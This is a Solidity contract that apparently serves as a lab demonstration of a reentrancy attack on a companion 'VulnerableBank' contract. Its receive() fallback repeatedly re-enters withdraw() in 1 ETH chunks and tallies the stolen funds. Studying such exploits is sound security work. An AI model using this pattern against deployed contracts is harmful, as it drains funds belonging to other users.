// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./VulnerableBank.sol";

contract ReentrancyAttacker {
  VulnerableBank public bank;
  uint public reentryCount;
  uint public totalStolen;
  uint public failedReentries;

  constructor(address bankAddress) {
    bank = VulnerableBank(bankAddress);
  }

  function attack() public payable {
    // Deposit our funds first
    bank.deposit{value: msg.value}();
    // Withdraw a small fixed chunk (1 ETH) to allow multiple nested withdrawals
    // while the recorded balance remains larger than the chunk.
    uint chunk = 1 ether;
    bank.withdraw(chunk);
  }

  // This gets called when bank.withdraw() sends us ETH via the .call()
  receive() external payable {
    reentryCount++;
    totalStolen += msg.value;

    // Attempt multiple nested withdraws of a small chunk (1 ETH).
    // This allows us to repeatedly withdraw while the recorded balance
    // remains >= chunk, demonstrating the vulnerability without causing
    // arithmetic underflow (since we withdraw smaller pieces).
    uint chunk = 1 ether;
    for (uint i = 0; i < 20; i++) {
      uint bal = bank.balances(address(this));
      if (bal < chunk) {
        break;
      }
      try bank.withdraw(chunk) {
        // success
      } catch {
        failedReentries++;
        break;
      }
    }
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

  function getBankBalance(address user) public view returns (uint) {
    return bank.balances(user);
  }
}

